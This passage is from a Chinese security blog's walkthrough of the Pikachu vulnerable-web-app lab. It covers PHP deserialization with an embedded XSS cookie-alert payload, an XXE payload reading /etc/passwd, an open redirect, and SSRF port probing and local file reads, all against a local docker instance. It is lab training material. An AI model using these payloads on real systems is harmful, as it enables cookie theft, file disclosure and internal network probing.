</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>使用下列代码生成恶意序列化数据</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">S</span><span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token variable">$code</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">S</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>生成序列化数据如下</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">&quot;S&quot;</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">&quot;test&quot;</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">39</span><span class="token punctuation">:</span><span class="token string double-quoted-string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>提交后，弹出cookie</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu83.png" alt="pikachu83"></p> <h1 id="xxe"><a href="#xxe" class="header-anchor">#</a> XXE</h1> <h2 id="xxe漏洞"><a href="#xxe漏洞" class="header-anchor">#</a> XXE漏洞</h2> <h3 id="概述"><a href="#概述" class="header-anchor">#</a> 概述</h3> <ul><li>XXE（外部实体注入）是XML注入的一种，普通的XML注入利用面比较狭窄，如果有的话也是逻辑类漏洞；XXE扩大了攻击面</li> <li>当允许引用外部实体时，就可能导致<strong>任意文件读取、系统命令执行、内网端口探测、攻击内网网站</strong>等危害</li> <li>防御方法：禁用外部实体（PHP：可以将libxml_disable_entity_loader设置为TRUE来禁用外部实体）</li></ul> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu84.png" alt="pikachu84"></p> <p>我们利用外部实体注入，读取/etc/passwd文件，xml-dtd的payload如下</p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  &lt;!DOCTYPE creds [   &lt;!ENTITY goodies SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;  &lt;creds&gt;&amp;goodies;&lt;/creds&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu85.png" alt="pikachu85"></p> <p>可以看到成功读取了文件进行显示</p> <h1 id="url重定向"><a href="#url重定向" class="header-anchor">#</a> URL重定向</h1> <h2 id="不安全的url跳转"><a href="#不安全的url跳转" class="header-anchor">#</a> 不安全的url跳转</h2> <ul><li>不安全的url跳转问题可能发生在一切执行了url地址跳转的地方</li> <li>如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页的url地址)参数作为了跳转的目的地,而又没有做判断的话就可能发生&quot;跳错对象&quot;的问题</li> <li>url跳转比较直接的危害是:钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</li></ul> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu86.png" alt="pikachu86"></p> <p>点击<code>我就是我,放荡不羁的我</code>后，url更新为</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://172.26.239.122/vul/urlredirect/urlredirect.php?url=i
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>尝试url字段修改为https://www.baidu.com</p> <p>页面重定向到了https://www.baidu.com，这里恶意利用的话可以搭建恶意站点，诱导用户点击</p> <h1 id="ssrf"><a href="#ssrf" class="header-anchor">#</a> SSRF</h1> <h2 id="ssrf-curl"><a href="#ssrf-curl" class="header-anchor">#</a> SSRF(curl)</h2> <p>点击后显示如下(docker搭建的环境，手动修复了下ip地址)</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu87.png" alt="pikachu87"></p> <p>尝试修改url字段为http://172.26.239.122:3306，进行SSRF端口探测</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu88.png" alt="pikachu88"></p> <p>其他端口探测同理，这里就不演示了，docker只映射了80和3306端口出来</p> <h2 id="ssrf-file-get-content"><a href="#ssrf-file-get-content" class="header-anchor">#</a> SSRF(file_get_content)</h2> <ul><li>file_get_content 可以对本地和远程的文件进行读取</li></ul> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu89.png" alt="pikachu89"></p> <p>这里读取本地/etc/passwd文件</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://172.26.239.122/vul/ssrf/ssrf_fgc.php?file=/etc/passwd
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu90.png" alt="pikachu90"></p></div></div> <div class="page-slot page-slot-bottom"><!-- 横向自适应 -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6620245489"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="page-edit"><!----> <div class="tags"><a href="/tags/?tag=web" title="标签">#web</a><a href="/tags/?tag=Pikachu" title="标签">#Pikachu</a></div> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">2022/09/25, 18:41:41</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><!----> <a href="/pages/2e1547494524d1c8/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">SUCTF 2019 CheckIn</div></a></div> <div class="page-nav"><p class="inner"><!----> <span class="next"><a href="/pages/2e1547494524d1c8/">SUCTF 2019 CheckIn</a>→
      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/2e1547494524d1d3/"><div>
            0CTF 2016 piapiapia
            <!----></div></a> <span class="date">07-23</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/2e1547494524d1d1/"><div>
            CISCN 2019 初赛 Love
            <!----></div></a> <span class="date">07-22</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/2e1547494524d1d0/"><div>
            PHP反序列化
            <!----></div></a> <span class="date">07-21</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:ZephyrChenWork@outlook.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/Zephyrccc" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2021-2022
    <span>Zephyr | <a href="https://github.com/xugaoyi/vuepress-theme-vdoing/blob/master/LICENSE" target="_blank">MIT License</a></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <!----> <!----> <div class="custom-html-window custom-html-window-rb" style="display:;"><div class="custom-wrapper"><span class="close-but">×</span> <div><!-- 固定160*160px -->
      <ins class="adsbygoogle"
          style="display:inline-block;max-width:160px;max-height:160px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="8377369658"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script>
      </div></div></div></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.d666345c.js" defer></script><script src="/assets/js/2.2caa9fc9.js" defer></script><script src="/assets/js/8.a8e385a7.js" defer></script>
  </body>
</html>
